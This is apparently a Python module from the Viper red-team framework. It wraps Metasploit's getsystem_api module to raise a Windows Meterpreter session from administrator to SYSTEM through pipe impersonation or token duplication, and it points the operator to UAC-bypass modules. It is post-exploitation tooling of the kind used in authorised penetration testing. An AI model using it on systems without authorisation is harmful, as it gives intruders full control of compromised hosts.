# -*- coding: utf-8 -*-
# @File  : SimpleRewMsfModule.py
# @Date  : 2019/1/11
# @Desc  :


from Lib.ModuleAPI import *


class PostModule(PostMSFRawModule):
    NAME_ZH = "Windows System提权"
    DESC_ZH = "模块尝试使用多种技术获取system权限,模块要求Session为绕过UAC的管理员权限"
    REQUIRE_SESSION = True
    MODULETYPE = TAG2TYPE.Privilege_Escalation
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["Administrator"]  # 所需权限
    ATTCK = ["T1055"]  # ATTCK向量
    README = ["https://www.yuque.com/vipersec/module/delftb"]
    REFERENCES = ["https://attack.mitre.org/techniques/T1088/"]
    AUTHOR = "Viper"
    OPTIONS = register_options([
        OptionEnum(name='TECHNIQUE', name_tag="提权技术", desc="选择提权技术,默认使用所有可利用方法", required=True,
                   default=0,
                   enum_list=[
                       {'name': '所有可用技术', 'value': 0},
                       {'name': '管道仿冒技术(内存/管理员权限)', 'value': 1},
                       {'name': '管道仿冒技术(加载器/管理员权限)', 'value': 2},
                       {'name': 'Token复制', 'value': 3},
                       {'name': '管道仿冒技术(RPCSS变量)', 'value': 4},
                   ]),
    ])

    def __init__(self, sessionid, ipaddress, custom_param):
        super().__init__(sessionid, ipaddress, custom_param)
        self.type = "post"
        self.mname = "windows/escalate/getsystem_api"

    def check(self):
        """执行前的检查函数"""

        session = Session(self._sessionid)
        if not session.is_windows:
            return False, "模块只支持Windows的Meterpreter"
        if session.is_admin is True:
            self.set_msf_option('TECHNIQUE', self.param('TECHNIQUE'))
            return True, None
        else:
            return False, "模块需要管理员权限,请尝试使用UAC绕过模块"

    def callback(self, status, message, data):
        # 调用父类函数存储结果(必须调用)

        if status is not True:
            self.log_error("模块运行失败,无法获取System权限,错误码: {} ".format(message))
            return
        else:
            self.log_good("获取成功,Session已获取System权限")
            return
